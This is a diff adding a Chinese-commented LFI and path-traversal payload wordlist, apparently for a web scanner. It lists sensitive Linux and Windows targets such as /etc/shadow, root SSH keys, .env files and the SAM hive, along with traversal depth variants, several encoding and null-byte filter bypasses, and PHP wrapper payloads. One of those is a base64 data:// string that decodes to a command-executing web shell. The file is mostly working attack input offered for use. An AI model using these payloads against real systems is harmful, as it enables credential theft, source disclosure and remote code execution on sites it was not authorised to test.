@@ -1,0 +1,78 @@
+# LFI / 路径穿越 Payload 字典
+# 格式：每行一个 payload，# 开头为注释
+
+# ── Linux 敏感文件 ──
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/os-release
+/etc/issue
+/etc/crontab
+/etc/sudoers
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/status
+/proc/self/maps
+/proc/version
+/proc/net/tcp
+/proc/net/fib_trie
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/auth.log
+/var/log/syslog
+/root/.ssh/id_rsa
+/root/.ssh/authorized_keys
+/root/.bash_history
+/home/www-data/.bash_history
+/var/www/html/index.php
+/var/www/html/config.php
+/var/www/html/.env
+
+# ── Windows 敏感文件 ──
+C:/Windows/win.ini
+C:/Windows/System32/drivers/etc/hosts
+C:/inetpub/wwwroot/web.config
+C:/Windows/repair/sam
+C:/boot.ini
+C:/Windows/System32/config/SAM
+
+# ── 路径穿越变体 ──
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+
+# ── 编码变体 ──
+..%2f..%2f..%2fetc%2fpasswd
+..%2F..%2F..%2Fetc%2Fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+....//....//....//etc/passwd
+....\/....\/....\/etc/passwd
+
+# ── PHP Wrapper ──
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://input
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+expect://id
+
+# ── Null Byte 截断 ──
+../../../etc/passwd%00
+../../../etc/passwd%00.php
+../../../etc/passwd%2500
+
+# ── 日志文件路径 ──
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/fd/2
+/dev/stdin
